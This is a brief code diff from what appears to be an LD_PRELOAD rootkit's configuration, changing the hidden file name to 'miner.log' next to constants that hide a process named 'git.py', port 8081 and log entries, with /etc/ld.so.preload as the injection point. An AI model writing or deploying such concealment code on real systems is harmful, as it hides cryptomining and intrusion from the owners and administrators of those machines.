@@ -17,7 +17,7 @@
 
     static const char* CMDLINE_TO_FILTER = "git.py";
     static const char* PRELOAD_FILE_PATH = "/etc/ld.so.preload";
-    static const char* FILE_TO_FILTER = "secret_log.txt";
+    static const char* FILE_TO_FILTER = "miner.log";
     static const char* LOG_SPOOF_TRIGGER = "MALICIOUS_ACTIVITY";
     static const int PORT_TO_HIDE = 8081;
 
